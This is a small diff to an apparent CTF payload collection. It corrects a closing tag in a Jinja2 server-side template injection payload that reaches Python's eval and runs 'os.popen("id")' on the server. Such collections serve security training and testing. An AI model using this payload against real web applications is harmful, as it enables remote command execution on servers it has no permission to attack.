@@ -1666,7 +1666,7 @@ This is a payload collection and references for CTF challenges.
               {{ b['eval']('__import__("os").popen("id").read()') }}
             {% endif %}
           {% endif %}
-        {% endif %}
+        {% endfor %}
       {% endif %}
     {% endfor %}
 
